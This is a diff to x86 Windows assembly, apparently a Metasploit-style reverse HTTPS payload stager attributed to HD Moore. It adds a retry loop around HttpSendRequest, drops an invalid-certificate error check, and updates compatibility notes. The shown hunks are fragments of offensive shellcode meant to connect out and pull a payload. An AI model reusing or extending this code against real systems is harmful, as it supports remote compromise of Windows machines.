@@ -1,6 +1,7 @@
 ;-----------------------------------------------------------------------------;
 ; Author: HD Moore
-; Compatible: ?
+; Compatible: Confirmed Windows 7, Windows XP
+; Known Bugs: Windows NT 4.0, Windows XP SP1 Embedded
 ; Version: 1.0
 ;-----------------------------------------------------------------------------;
 [BITS 32]
@@ -67,6 +68,10 @@ httpopenrequest:
   call ebp
   mov esi, eax           ; hHttpRequest
 
+set_retry:
+  push byte 0x02
+  pop ebx
+
 httpsendrequest:
   xor edi, edi
   push edi               ; optional length
@@ -86,9 +91,11 @@ check_ssl:
 ;  push 0x5DE2C5AA        ; hash( "kernel32.dll", "GetLastError" )
 ;  call ebp
 
-  ; The error message is left in ECX
-  cmp cl, 0x0d           ; ERROR_INTERNET_INVALID_CA (0x2f0d)
-  jne failure
+; The error message is left in ECX on some platforms (but not wow64)
+ ; cmp cl, 0x0d           ; ERROR_INTERNET_INVALID_CA (0x2f0d)
+
+  dec ebx
+  jz failure
 
 ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
 set_security_options:
